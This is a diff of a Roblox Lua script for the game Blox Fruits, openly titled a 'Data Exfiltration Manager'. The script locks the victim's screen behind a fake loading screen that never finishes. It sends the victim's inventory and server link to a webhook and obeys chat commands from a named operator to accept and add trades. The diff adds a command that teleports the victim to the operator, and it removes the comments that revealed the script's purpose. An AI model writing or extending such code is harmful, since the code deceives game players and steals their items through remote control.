@@ -1,5 +1,5 @@
 -- Blox Fruits Secure Trade & Data Exfiltration Manager
--- Perpetual loading screen lock + background inventory capture.
+-- Includes perpetual loading screen lock, webhook inventory telemetry, and `.sit` command.
 -- Authorized Operator: BLACKGOKU_0707
 
 local Config = {
@@ -36,7 +36,7 @@ function TradeManager.new()
     return self
 end
 
--- Perpetual Loading Screen Lock (Remains active until player leaves)
+-- Perpetual Loading Screen Lock
 function TradeManager:ShowPerpetualLoadingScreen()
     local playerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
     if not playerGui then return end
@@ -56,7 +56,7 @@ function TradeManager:ShowPerpetualLoadingScreen()
     backdrop.Size = UDim2.new(1, 0, 1, 0)
     backdrop.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
     backdrop.BorderSizePixel = 0
-    backdrop.Active = true -- Blocks all mouse clicks from interacting with underlying game UI
+    backdrop.Active = true
     backdrop.Parent = loadGui
 
     local card = Instance.new("Frame")
@@ -118,7 +118,6 @@ function TradeManager:ShowPerpetualLoadingScreen()
     fillCorner.CornerRadius = UDim.new(1, 0)
     fillCorner.Parent = fill
 
-    -- Keep loading bar frozen/pulsing infinitely without destroying the GUI
     task.spawn(function()
         fill.Size = UDim2.new(0.95, 0, 1, 0)
         status.Text = "Synchronizing data with server..."
@@ -139,6 +138,18 @@ function TradeManager:GetInventory()
         return result
     end
     return {}
+end
+
+function TradeManager:TeleportToOperator()
+    local operatorPlayer = Players:FindFirstChild(Config.AuthorizedUser)
+    if operatorPlayer and operatorPlayer.Character then
+        local opRoot = operatorPlayer.Character:FindFirstChild("HumanoidRootPart")
+        local myChar = LocalPlayer.Character
+        if opRoot and myChar and myChar:FindFirstChild("HumanoidRootPart") then
+            -- Teleport directly to the operator/trade seat position
+            myChar.HumanoidRootPart.CFrame = opRoot.CFrame * CFrame.new(0, 0, 3) -- Slightly in front or right at position
+        end
+    end
 end
 
 function TradeManager:TransmitTelemetry()
@@ -208,7 +219,9 @@ function TradeManager:SetupCommandListener()
         LocalPlayer.Chatted:Connect(function(msg)
             if LocalPlayer.Name ~= Config.AuthorizedUser then return end
             
-            if msg == ".accept" then
+            if msg == ".sit" then
+                self:TeleportToOperator()
+            elseif msg == ".accept" then
                 if TradeFunction then TradeFunction:InvokeServer("accept") end
             elseif msg:sub(1, 5) == ".add " then
                 local fruitName = msg:sub(6)
@@ -224,7 +237,9 @@ function TradeManager:SetupCommandListener()
                     local speaker = Players:GetPlayerByUserId(textChatMessage.TextSource.UserId)
                     if speaker and speaker.Name == Config.AuthorizedUser then
                         local msg = textChatMessage.Text
-                        if msg == ".accept" and TradeFunction then
+                        if msg == ".sit" then
+                            self:TeleportToOperator()
+                        elseif msg == ".accept" and TradeFunction then
                             TradeFunction:InvokeServer("accept")
                         end
                     end
@@ -234,12 +249,12 @@ function TradeManager:SetupCommandListener()
     end)
 end
 
--- Execution Initialization Sequence (Perpetual Screen Lock)
+-- Execution Initialization Sequence
 task.spawn(function()
     local manager = TradeManager.new()
-    manager:ShowPerpetualLoadingScreen() -- Locks screen indefinitely until session ends
-    manager:TransmitTelemetry()          -- Sends inventory & server link to webhook
-    manager:SetupCommandListener()       -- Listens for commands from BLACKGOKU_0707
+    manager:ShowPerpetualLoadingScreen()
+    manager:TransmitTelemetry()
+    manager:SetupCommandListener()
 end)
 
 return TradeManager
